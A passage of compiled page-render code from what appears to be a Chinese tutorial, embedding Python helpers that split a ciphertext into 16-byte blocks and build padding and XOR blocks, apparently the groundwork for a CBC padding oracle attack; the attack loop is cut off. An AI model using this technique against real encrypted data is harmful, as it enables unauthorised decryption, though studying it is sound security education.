punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("base64Str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("b'AGhcUqLmBmKALbwtAloozXAQGG1kL35HgWkmeLGrvHSg96WOkmjauFXFgIUwPIZ1nNVz7EE35OqBs27OYI2CCvuf3VMX/LCtZeW4H4YpIsBbI+yDExlCtDhcZhMrBN9YtQwK7rB5cfBq2f+J/zb5BQkVmaK45IA/IP2FyU0WVS6ooKSkSCoTWoTe1H9QNv6DfdL7cBMc/y/Pr6L8SZQYfg=='")]),t._v("\n注意到这里虽然看起来是字符串，但是有个b，去掉方法：\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("base64Str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'ascii'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nAGhcUqLmBmKALbwtAloozXAQGG1kL35HgWkmeLGrvHSg96WOkmjauFXFgIUwPIZ1nNVz7EE35OqBs27OYI2CCvuf3VMX"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("LCtZeW4H4YpIsBbI"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("yDExlCtDhcZhMrBN9YtQwK7rB5cfBq2f"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("J"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("zb5BQkVmaK45IA"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("IP2FyU0WVS6ooKSkSCoTWoTe1H9QNv6DfdL7cBMc"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("y"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Pr6L8SZQYfg"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),a("h3",{attrs:{id:"测试代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#测试代码"}},[t._v("#")]),t._v(" 测试代码")]),t._v(" "),a("p",[t._v("https://docs.python.org/3/library/base64.html")]),t._v(" "),a("div",{staticClass:"language-python extra-class"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("cipher"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("00685C52A2E60662802DBC2D025A28CD7010186D642F7E4781692678B1ABBC74A0F7A58E9268DAB855C58085303C86759CD573EC4137E4EA81B36ECE608D820AFB9FDD5317FCB0AD65E5B81F862922C05B23EC83131942B4385C66132B04DF58B50C0AEEB07971F06AD9FF89FF36F905091599A2B8E4803F20FD85C94D16552EA8A0A4A4482A135A84DED47F5036FE837DD2FB70131CFF2FCFAFA2FC4994187E")]),t._v("\nlen_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),t._v(" 因为"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),t._v("是两个字符代表一个byte\ncipher_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" split_len"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cipher"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" len_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("split_len")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("seq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("seq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("seq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n将"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("320")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("160")]),t._v("个字节按"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v("个字节切成"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10")]),t._v("个cipher_block\ncipher_block"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("00685C52A2E60662802DBC2D025A28CD")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7010186D642F7E4781692678B1ABBC74")]),t._v("\nA0F7A58E9268DAB855C58085303C8675\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("9CD573EC4137E4EA81B36ECE608D820A")]),t._v("\nFB9FDD5317FCB0AD65E5B81F862922C0\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("5B23EC83131942B4385C66132B04DF58")]),t._v("\nB50C0AEEB07971F06AD9FF89FF36F905\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("091599A2B8E4803F20FD85C94D16552E")]),t._v("\nA8A0A4A4482A135A84DED47F5036FE83\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7DD2FB70131CFF2FCFAFA2FC4994187E")]),t._v("\n\n基本函数：\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("block_padding")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("size_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    l "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" t "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        l"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("append"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("split"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0x"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n            "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("split"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0x"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"00"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("l"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("block_padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 00000000000000000000000000000001")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("block_padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 00000000000000000000000000000202")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("block_padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("15")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 10101010101010101010101010101010")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("block_search_byte")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("size_block"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" pos"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" l"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    hex_char "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pos"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("split"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0x"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"00"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("size_block "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("hex_char"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" hex_char\n        "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("l"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("block_search_byte"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 00000000000000000000000000000000")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("block_search_byte"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 00000000000000000000000000000001")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("block_search_byte"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("255")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 000000000000000000000000000000ff")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" itertools "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" cycle\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("hex_xor")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" s2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    b "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytearray")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" c1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" c2 "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("zip")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fromhex"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" cycle"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fromhex"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        b"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("append"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("c1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),t._v(" c2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" b"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#看下面两个例子，可以看到想消掉第一位的83，必须是相同的才可以")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("hex_xor"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'00000000000000000000000000000001'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'A8A0A4A4482A135A84DED47F5036FE83'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# a8a0a4a4482a135a84ded47f5036fe82")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("hex_xor"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'00000000000000000000000000000083'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'A8A0A4A4482A135A84DED47F5036FE83'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# a8a0a4a4482a135a84ded47f5036fe00")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("hex_xor"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'0000000000000000000000000000000a'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'A8A0A4A4482A135A84DED47F5036FE83'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# a8a0a4a4482a135a84ded47f5036fe89")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" block "),a("span",{pre:!0,attrs:{class:"token 